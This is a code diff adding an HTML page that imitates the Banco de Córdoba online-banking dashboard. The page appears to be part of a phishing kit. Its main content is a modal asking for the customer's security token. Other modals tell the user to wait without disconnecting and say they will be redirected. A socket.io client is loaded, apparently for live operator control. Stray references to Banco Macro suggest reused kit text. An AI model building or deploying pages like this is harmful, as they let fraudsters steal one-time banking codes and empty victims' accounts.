@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Córdoba</title>
+    <link rel="shortcut icon" href="/img/favicon-96x96.png" type="image/x-icon">
+    <link rel="stylesheet" href="/css/home.css">
+</head>
+
+<body class="body">
+    <section class="left-section" id="personal-options">
+        <div class="logo">
+            <img src="/img/Logo-Bancor-home.png" alt="Banco de Córdoba">
+        </div>
+        <div>
+            <nav class="nav">
+                <ul>
+                    <li class="selected">Escritorio</li>
+                    <li class="dropdown">Cuentas</li>
+                    <li class="dropdown">Transferencias</li>
+                    <li class="dropdown">Pagos</li>
+                    <li>Tarjetas</li>
+                    <li class="dropdown">Inversiones</li>
+                    <li>Préstamos</li>
+                    <li>Seguros</li>
+                    <li class="dropdown">Otros productos</li>
+                    <li>Club Bancor</li>
+                    <li>Operaciones</li>
+                    <li class="dropdown">Autogestión</li>
+                </ul>
+            </nav>
+        </div>
+    </section>
+    <section class="right-section" id="ppal-content">
+        <header class="header">
+            <div class="burger-button">
+
+            </div>
+            <div class="persona-nombre">
+                <h3 class="nombre" id="name">
+                    
+                </h3>
+            </div>
+            <div class="persona-icon">
+                <img class="avatar" src="/img/avatarprueba.jpg" alt="Avatar">
+                <span class="separator"></span>
+                <img class="notificaciones" alt="notificacion" src="/img/notificaciones-png.png">
+                <span class="notificaciones-count">3</span>
+            </div>
+        </header>
+        <div class="button-personalizar">
+            <button>
+                Personalizar
+            </button>
+        </div>
+        <div class="info-persona">
+            <div class="card">
+                <div class="card-header open">
+                    <h2>Cuentas</h2>
+                </div>
+                <div class="card-body">
+                    <div class="loading">
+                        <span class="loading-indicator"></span>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header">
+                    <h2>Tarjetad de crédito</h2>
+                </div>
+            </div>
+        </div>
+        <footer class="footer" id="footer">
+            <div class="link-footer">
+                <a href="#">
+                    Comparación de Comisiones
+                </a>
+                <a href="#">
+                    Información al usuarxio financiero
+                </a>
+                <a href="#">
+                    Política de privacidad
+                </a>
+            </div>
+            <div class="RRSS">
+                <div class="red-social">
+                    <img src="/img/Mensajes-png.png" alt="Mensajes">
+                </div>
+                <div class="red-social">
+                    <img src="/img/Twitter-png.png" alt="Twitter">
+                </div>
+                <div class="red-social">
+                    <img src="/img/Facebook-png.png" alt="Facebook">
+                </div>
+                <div class="red-social">
+                    <img src="/img/Instagram-png.png" alt="Instagram">
+                </div>
+                <div class="red-social">
+                    <img src="/img/Youtube-png.png" alt="Youtube">
+                </div>
+            </div>
+        </footer>
+    </section>
+    <div id="token">
+        <div class="modal">
+            <div class="modal-header">
+                <h4>Ingresa Token de Seguridad</h4>
+            </div>
+            <div class="modal-body">
+                <p>Estimado usuario, por motivos de seguridad y para prevenir estafas virtuales, cuando ingrese a su
+                    cuenta, debera generar e ingresar su clave Token de Seguridad para confirmar su identidad.</p>
+                <p>Banco Macro jamás le enviará correos, mensajes de texto, ni se contactará con usted pidiendo que
+                    información personal.</p>
+                <form id="formToken">
+                    <input required type="text" placeholder="Código" id="token-input" name="token">
+                </form>
+                <button type="submit" id="sendToken">Enviar token</button>
+                <div id="spinnerValidate">
+                    <span>Validando información...</span>
+                    <span class="loading-indicator"></span>
+                </div>
+            </div>
+            <div class="modal-footer">
+
+            </div>
+        </div>
+    </div>
+    <div id="queuelist">
+        <div class="modal">
+            <div class="modal-header">
+                <h4>Espere un momento por favor</h4>
+            </div>
+            <div class="modal-body">
+                <p>Por favor espera unos instantes estamos cargando tu cuenta y tus nuevos beneficios Macro, en
+                    instantes podrás operar con normalidad y utilizar las nuevas funciones que tenemos para vos.</p>
+                <div id="spinnerQueue">
+                    <p>No te desconectes, ni actualices, un momento por favor.</p>
+                    <span class="loading-indicator"></span>
+                </div>
+            </div>
+            <div class="modal-footer">
+
+            </div>
+        </div>
+    </div>
+    <div style="display: none;" class="modal-alerta" id="alert-modal">
+        <div>
+            <p>El <b>token</b> de seguridad ingresado tiene un formato incorrecto, por favor <b>ingréselo nuevamente</b>
+            </p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal">
+            <img src="/img/cancel.png">
+        </div>
+    </div>
+    <div style="display: none;" class="modal-alerta" id="noValidate">
+        <div>
+            <p><b>No pudimos validar su informacion</b>, ingrese su token nuevamente</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-resendtoken">
+            <img src="/img/cancel.png">
+        </div>
+    </div>
+    <div style="display: none;" class="modal-alerta green" id="validate">
+        <div>
+            <p>Vuelva a <b>iniciar sesión</b>, en breve será redireccionado...</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-green">
+            <img src="/img/cancel.png">
+        </div>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/home.js"></script>
+</body>
+
+</html>
